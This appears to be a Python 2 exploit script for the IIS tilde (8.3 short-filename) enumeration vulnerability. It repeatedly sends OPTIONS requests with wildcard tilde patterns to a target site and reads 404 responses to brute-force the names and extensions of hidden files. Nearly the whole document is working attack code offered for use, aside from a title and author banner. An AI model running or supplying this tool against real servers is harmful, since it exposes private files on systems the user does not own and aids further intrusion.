# iis_tilde
IIS Tilde Vulnerability
import urllib2
files = list()
types = list()
site ='http://Example.com/'

print "++++++++++Aidin NaseriFard++++++++++++++++"
print "+++++++++Files Name+++++++++++++++++++++++++"
print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
for i in range(97,122):
    try:
        opener = urllib2.build_opener(urllib2.HTTPHandler)
        request = urllib2.Request(site+chr(i)+'*~1*/aspx')
        request.get_method = lambda: 'OPTIONS'
        url = opener.open(request)
    except urllib2.URLError, e:
        if e.code == 404:
            print site+chr(i)+'*~1*/aspx'
            files.append(chr(i))
for base in files:
    lens = '%3f'
    count = 0
    while True:
        try:
            opener = urllib2.build_opener(urllib2.HTTPHandler)
            request = urllib2.Request(site+base+lens+'~1*/aspx')
            request.get_method = lambda: 'OPTIONS'
            url = opener.open(request)
            count = count + 1
            lens = lens + '%3f'
        except urllib2.URLError, e:
            if e.code == 404:
                count = count + 1
                break
    for j in range(0,count):
        for i in range(97,122):
            try:
                opener = urllib2.build_opener(urllib2.HTTPHandler)
                request = urllib2.Request(site+base+chr(i)+'*~1*/aspx')
                request.get_method = lambda: 'OPTIONS'
                url = opener.open(request)
            except urllib2.URLError, e:
                if e.code == 404:
                    print site+base+chr(i)+'*~1*/aspx'
                    files[files.index(base)] = base + chr(i)
                    base = base + chr(i)
    print "++++++++++++++++++++++++++++++++++++++++++++"


print "\n++++++++++++++++++++++++++++++++++++++++++++"
print "+++++++++Files Type+++++++++++++++++++++++++"
print "++++++++++++++++++++++++++++++++++++++++++++"
for base in files:
    for i in range(97,122):
        try:
            opener = urllib2.build_opener(urllib2.HTTPHandler)
            request = urllib2.Request(site+base+'~1.'+chr(i)+'*/aspx')
            request.get_method = lambda: 'OPTIONS'
            url = opener.open(request)
        except urllib2.URLError, e:
            if e.code == 404:
                print site+base+'~1.'+chr(i)+'/aspx'
                types.append(chr(i))
    for base2 in types:
        lens = '%3f'
        count = 0
        while True:
            try:
                opener = urllib2.build_opener(urllib2.HTTPHandler)
                request = urllib2.Request(site+base+'~1.'+base2+lens+'/aspx')
                request.get_method = lambda: 'OPTIONS'
                url = opener.open(request)
                count = count + 1
                lens = lens + '%3f'
            except urllib2.URLError, e:
                if e.code == 404:
                    count = count + 1
                    break
        for j in range(0,count):
            for i in range(97,122):
                try:
                    opener = urllib2.build_opener(urllib2.HTTPHandler)
                    request = urllib2.Request(site+base+'~1.'+base2+chr(i)+'*/aspx')
                    request.get_method = lambda: 'OPTIONS'
                    url = opener.open(request)
                except urllib2.URLError, e:
                    if e.code == 404:
                        print site+base+'~1.'+base2+chr(i)+'*/aspx'
                        types[types.index(base2)] = base2 + chr(i)
                        base2 = base2 + chr(i)
        print "+++++++++++++++++++++++++++++++++++++++++++++++"
